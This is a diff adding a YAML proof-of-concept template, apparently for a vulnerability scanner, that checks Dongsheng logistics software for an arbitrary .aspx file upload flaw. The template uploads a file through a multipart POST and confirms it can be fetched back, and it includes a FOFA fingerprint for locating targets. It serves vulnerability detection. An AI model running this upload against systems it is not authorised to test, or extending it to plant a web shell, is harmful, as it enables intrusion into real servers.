@@ -1,0 +1,38 @@
+id: poc-yaml-dongshengsoft-uploadfile-anyfile-upload
+info:
+  name: 东胜物流软件 UploadFile 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 东胜物流软件
+  fofa: fid="Z4c2hPCi5IR/AnH5vZXNSQ=="
+variables:
+  t1: random_str(8)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /MvcContainer/MsOpCtnBsCard/UploadFile
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5Mawpg068t7pbxZ
+  data: '------WebKitFormBoundaryD5Mawpg068t7pbxZ
+
+    Content-Disposition: form-data; name="type"
+
+
+    1
+
+    ------WebKitFormBoundaryD5Mawpg068t7pbxZ
+
+    Content-Disposition: form-data; name="LoadFile"; filename="{{.t1}}.aspx"
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryD5Mawpg068t7pbxZ--'
+  expression: status_code == 200 && contains(body,".aspx") && contains(body,"UploadFiles")
+  output:
+  - regex_match(body,"\\\\(?P<file>[0-9a-zA-Z]+).aspx")
+- method: GET
+  path: /UploadFiles/MsOpFiles/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
